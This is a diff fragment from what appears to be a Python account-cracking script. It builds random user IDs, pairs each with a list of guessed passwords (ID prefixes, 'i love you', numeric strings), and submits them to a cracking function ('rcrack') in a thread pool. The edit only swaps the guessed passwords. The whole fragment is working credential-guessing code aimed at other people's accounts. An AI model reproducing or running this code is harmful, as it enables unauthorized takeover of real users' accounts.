@@ -409,12 +409,11 @@ def random_number():
 
 			uid = kode+guru
 			mk = uid[:6]
-			pwx = [kode+guru,mk,'free fire','i love you','57273200']
+			pwx = [kode+guru,mk,'636180','i love you','57273200']
 			pwx = [kode+guru,mk,'57273200','59039200','57273200']
 			mk = uid[:6]
 			pwx = [guru]
-			pwx = [kode+guru,mk,'free fire','i love you','57273200']
-
+			pwx = [kode+guru,mk,'57273200','59039200','57575751']
 			yaari.submit(rcrack,uid,pwx,tl)
 
 	print(47*"-")
